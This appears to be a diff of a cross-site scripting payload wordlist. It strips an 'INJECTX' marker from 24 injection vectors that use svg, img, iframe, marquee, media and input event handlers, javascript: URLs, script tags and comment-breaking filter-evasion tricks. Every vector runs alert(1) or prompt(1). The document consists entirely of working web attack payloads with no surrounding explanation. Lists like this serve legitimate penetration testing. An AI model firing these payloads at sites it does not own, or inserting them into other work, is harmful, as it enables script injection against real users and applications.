@@ -1,24 +1,24 @@
-javascript:alert(1)//INJECTX
-<svg/onload=alert(1)>//INJECTX
-<img src=x onerror=alert(1)>//INJECTX
-<img src=x onerror=prompt(1)>//INJECTX
-<iframe/onload=alert(1)>//INJECTX
-<marquee onstart=alert(1)>//INJECTX
-<video><source onerror="alert(1)">//INJECTX
-<audio><source onerror="alert(1)">//INJECTX
-<a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>
-<input autofocus onfocus=alert(1)>//INJECTX
-<select autofocus onfocus=alert(1)>//INJECTX
-<textarea autofocus onfocus=alert(1)>//INJECTX
-<keygen autofocus onfocus=alert(1)>//INJECTX
-<button form=test onformchange=alert(1)>//INJECTX
-<p onclick=alert(1)>Click Me</p>//INJECTX
-<script>alert(1)//INJECTX</script>
-<script>alert(1)<!--INJECTX</script>
-<script>$=1,alert($)</script>//INJECTX
-<svg onload=(alert)(1)>//INJECTX
-<svg/onload=alert`1`>//INJECTX
-<img/src=x onerror=alert`1`>//INJECTX
-<!--<img src="--><img src=x onerror=alert(1)//">//INJECTX
-<form><button formaction="javascript:alert(1)">Click</button></form>//INJECTX
-<marquee loop=1 width=0 onfinish=alert(1)>//INJECTX
+javascript:alert(1)
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<img src=x onerror=prompt(1)>
+<iframe/onload=alert(1)>
+<marquee onstart=alert(1)>
+<video><source onerror="alert(1)">
+<audio><source onerror="alert(1)">
+<a href="javascript:alert(1)" onmouseover=alert(1)>Hover me</a>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<button form=test onformchange=alert(1)>Click</button>
+<p onclick=alert(1)>Click Me</p>
+<script>alert(1)</script>
+<script>alert(1)<!--</script>
+<script>$=1,alert($)</script>
+<svg onload=(alert)(1)>
+<svg/onload=alert`1`>
+<img/src=x onerror=alert`1`>
+<!--<img src="--><img src=x onerror=alert(1)//>
+<form><button formaction="javascript:alert(1)">Click</button></form>
+<marquee loop=1 width=0 onfinish=alert(1)>
